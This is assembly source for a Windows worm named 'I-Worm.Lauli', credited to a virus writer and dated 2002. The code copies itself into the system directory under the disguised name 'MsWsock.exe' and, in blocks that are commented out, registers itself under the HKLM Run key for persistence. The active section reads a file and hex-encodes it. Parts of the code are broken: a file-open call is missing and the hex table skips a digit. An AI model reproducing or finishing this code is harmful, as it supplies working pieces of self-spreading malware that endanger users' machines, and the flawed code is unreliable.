comment $
Name : I-Worm.Lauli
Author : PetiK
Date : 7th June 2002 - 

$

.586p
.model flat
.code

JUMPS

api macro a
    extrn a:proc
    call a
endm

include useful.inc

st_worm:push    50
    mov esi,offset org_wrm
    push    esi
    push    0
    api GetModuleFileNameA

    mov edi,offset cpy_wrm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"WsM\"
    stosd
    mov eax,"kcos"
    stosd
    mov eax,"exe."
    stosd
    pop edi

;cop:   push    0
;   push    edi
;   push    esi
;   api CopyFileA

;reg:   push    50
;   push    edi
;   push    1
;   @pushsz "Wsock32"
;   @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
;   push    80000002h
;   api SHSetValueA

    push    0
    push    80h
    push    3
    push    0
    push    1
    push    80000000h
    @pushsz "code.txt"  ;push   offset org_wrm
    inc eax
    je  end_cr_vbs
    dec eax
    xchg    eax,ebx

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    2
    push    eax
    push    ebx
    api CreateFileMappingA
    test    eax,eax
    je  end_vbs1
    xchg    eax,ebp

    push    40h
    @pushsz "OK"
    @pushsz "OK"
    push    0
    api MessageBoxA

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    4
    push    ebp
    api MapViewOfFile
    test    eax,eax
    je  end_vbs2

    push    0
    push    ebx
    api GetFileSize
    mov [size],eax

    chk_byte:
    mov edi,offset hex
    push    edi
    p_c:    lodsb
    call    convert
    stosb
    dec size
    cmp size,0
    jnz p_c
    pop edi

    push    40h
    @pushsz "Hex String:"
    push    edi
    push    0
    api MessageBoxA

    end_vbs3:
    push    esi
    api UnmapViewOfFile
    end_vbs2:
    push    ebp
    api CloseHandle
    end_vbs1:
    push    ebx
    api CloseHandle
    end_cr_vbs:

end_worm:
    push    0
    api ExitProcess

    convert:
    push    ecx
    push    edi
    xor ecx,ecx
    mov cl,al
    push    ecx
    shr cl,4
    lea edi,hex_table
    inc cl
    @@y:
    inc edi
    dec cl
    jnz @@y
    dec edi
    mov al, byte ptr [edi]
    pop ecx
    and cl,0Fh
    lea edi,hex_table
    inc cl
    @@x:
    inc edi
    dec cl
    jnz @@x
    dec edi
    mov ah,byte ptr [edi]
    pop edi
    pop ecx
    ret


.data
cpy_wrm     db 50 dup (0)
org_wrm     db 50 dup (0)

size        dd ?
hex_table   db "012345789ABCDEF",0

hex     db 5000 dup (?)

end st_worm
end
